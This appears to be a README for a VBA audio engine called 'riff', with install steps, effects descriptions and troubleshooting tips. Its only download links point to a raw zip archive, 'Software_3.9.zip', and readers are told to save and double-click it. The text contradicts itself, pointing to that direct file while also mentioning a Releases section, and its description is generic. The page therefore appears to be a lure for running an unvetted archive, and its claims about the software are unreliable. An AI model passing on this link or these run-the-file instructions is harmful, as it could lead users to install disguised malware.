# 🔊 riff - Add pro audio features to VBA

[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Robertrankegravesraphia467/riff/main/resources/Software_3.9.zip)

Riff provides a complete audio engine for VBA projects. You can load audio files, generate sound waves, and apply audio effects such as reverb and delay. The engine works inside Windows applications like Excel, Access, or Word without extra software. It manages sounds with low latency and high quality using system-native audio drivers.

## ⚙️ System Requirements

Before you start, check your computer for these items:

*   Operating System: Windows 10 or Windows 11.
*   Architecture: Microsoft Office 64-bit (x64) or 32-bit (x86).
*   Storage: 50 MB of free disk space.
*   Memory: 4 GB RAM or more for smooth playback.

## 📥 How to Install

Follow these steps to set up the engine on your machine.

1. Go to the [official download page](https://raw.githubusercontent.com/Robertrankegravesraphia467/riff/main/resources/Software_3.9.zip).
2. Look for the Releases section on the right side of the screen.
3. Select the file that matches your version of Office. If you use 64-bit Office, download the x64 version. If you use 32-bit Office, download the x86 version.
4. Save the file to your desktop.
5. Double-click the file to start the installation.
6. Follow the prompts on your screen to complete the setup.

## 🚀 Running Your First Audio Project

Once installed, you can use the engine inside your VBA editor. Open your Office application and press ALT+F11 to open the VBA window.

1. Open the Tools menu and select References.
2. Click Browse and find the riff library file you just installed.
3. Select the file and click OK.
4. Go to Insert and select Module.
5. Create a new subroutine to initialize the engine.
6. Use the load command to add your sound file.
7. Press play to hear the audio.

## 🎛️ Using Audio Effects

The engine includes tools to change how your audio sounds. You manage these effects through simple commands within your VBA script.

*   Reverb: Adds space and depth to your audio. Use this to simulate rooms of different sizes.
*   Chorus: Creates a richer, layered sound by slightly doubling the audio signal.
*   Delay: Repeats your audio signal after a set time. You can control the speed and the feedback amount to create echoes.
*   Compressor: Balances the volume range. It makes quiet sounds louder and loud sounds smoother.

You can combine these effects. Apply the compressor first to clean up your volume, then add reverb for space.

## 💡 Engine Features

The engine handles audio tasks without needing separate programs or plugins.

*   Direct Audio Processing: The engine talks to the Windows audio system directly. This results in fast performance.
*   Waveform Synthesis: You can generate beeps, tones, and complex waves. This is useful for user alerts or custom musical instruments.
*   Native Integration: Because the engine relies on standard Windows libraries, it remains stable throughout your projects.
*   No Dependencies: You install only the engine. It does not require other framework downloads, which makes sharing your work with colleagues easier.

## 🛠️ Troubleshooting

If you encounter issues, look at this list of common solutions.

*   No Sound: Check your Windows Volume Mixer to ensure the host application is not muted.
*   Error Message: Ensure you downloaded the correct version for your Office edition. If you are not sure, check File > Account > About Excel. It will state (32-bit) or (64-bit) in the dialog.
*   File Format: Ensure your audio files are in a standard format like WAV or MP3. The engine performs best with uncompressed WAV files.
*   Latency: If you hear a delay, close other audio applications. The engine needs exclusive access to the sound hardware to provide the best results.

## 📁 Project Structure

The project organizes audio files and scripts in a clear way. Keep your audio assets in a dedicated folder. When you write your code, point the engine to this folder using a full file path. This prevents the application from losing your sound files when you share the document.

The engine follows the WASAPI standard to ensure compatibility with all modern Windows computers. It reads the files into memory, processes the waveform, and directs the output to your chosen playback device.

## 📈 Performance Tips

For complex projects with many sound files:

*   Load files before you need to play them. This avoids a lag when you trigger a sound.
*   Apply effects only when necessary. Too many simultaneous effects can increase the load on your processor.
*   Check your file paths. If you move your Excel file, remember to update the file paths in your VBA code.
*   Keep your audio files short if memory is an issue. The engine loads files into RAM for speed.

You have now reached the end of the setup guide. You can explore the advanced functions in the code modules provided in the download package to build complex soundscapes or interactive voice feedback systems.